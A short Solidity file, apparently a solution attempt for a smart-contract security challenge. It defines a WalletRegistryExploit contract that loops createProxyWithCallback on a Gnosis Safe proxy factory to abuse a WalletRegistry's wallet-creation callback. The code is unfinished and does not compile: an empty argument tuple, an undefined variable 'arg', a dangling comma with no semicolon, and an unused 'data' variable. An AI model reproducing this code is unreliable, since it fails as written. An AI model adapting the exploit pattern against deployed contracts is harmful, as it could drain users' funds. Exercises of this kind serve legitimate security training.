pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";


contract WalletRegistryExploit {
    GnosisSafeProxyFactory public immutable factory;

    constructor(GnosisSafeProxyFactory _factory) {
        factory = _factory;
    }

    function exploit(address masterCopy) external {
        bytes memory data = abi.encodeWithSelector(WalletRegistry.proxyCreated.selector, ());
        for(uint i = 0; i < 4; i++) {
            factory.createProxyWithCallback(masterCopy, abi.encodeWithSelector(GnosisSafe.setup.selector, arg), 0, )
        }
    }
}